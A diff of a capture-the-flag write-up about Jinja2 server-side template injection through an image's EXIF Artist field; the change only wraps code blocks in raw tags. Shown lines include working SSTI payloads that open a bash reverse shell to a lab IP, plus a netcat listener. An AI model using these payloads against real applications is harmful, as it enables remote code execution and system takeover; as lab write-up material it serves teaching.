@@ -215,12 +215,12 @@ The preview page displays:
 **Hypothesis:** EXIF metadata is extracted and rendered through Jinja2 template without sanitization.
 
 **SSTI Test:**
-
+{% raw %}
 ```bash
 convert -size 1x1 xc:white /tmp/test.png
 exiftool -Artist='{{7*7}}' /tmp/test.png
 ```
-
+{% endraw %}
 **Result:** Uploaded image, accessed preview - **"49" appeared** in the Artist field.
 
 ✅ **SSTI Confirmed** - Jinja2 template injection via EXIF Artist field.
@@ -234,12 +234,12 @@ nc -lvnp 4444
 ```
 
 **Payload Creation:**
-
+{% raw %}
 ```bash
 convert -size 1x1 xc:white /tmp/shell.png
 exiftool -Artist='{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/10.200.31.196/4444 0>&1\"").read() }}' /tmp/shell.png
 ```
-
+{% endraw %}
 **Execution:**
 1. Uploaded `shell.png` with SSTI payload
 2. Triggered `/admin/logo_preview?file=shell.png`
@@ -289,12 +289,12 @@ HSM{a3fec2e83dad}
 ---
 
 ## Alternative Payload
-
+{% raw %}
 ```bash
 convert -size 1x1 xc:white /tmp/shell.png
 exiftool -Artist='{{lipsum.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/10.200.31.196/4444 0>&1\"").read()}}' /tmp/shell.png
 ```
-
+{% endraw %}
 **Payload Breakdown:**
 
 | Component | Purpose |
@@ -472,19 +472,19 @@ Error: File 'passwd' not found.
 ```
 
 ### Approach 2: SSTI via EXIF Comment Field
-
+{% raw %}
 ```bash
 exiftool -Comment='{{7*7}}' /tmp/test.png
 ```
-
+{% endraw %}
 **Result:** ❌ Failed - Comment field not rendered in template, only Artist/Copyright displayed
 
 ### Approach 3: Direct SSTI in Filename
-
+{% raw %}
 ```bash
 mv test.png '{{7*7}}.png'
 ```
-
+{% endraw %}
 **Result:** ❌ Failed - Filename sanitized on upload
 
 ---
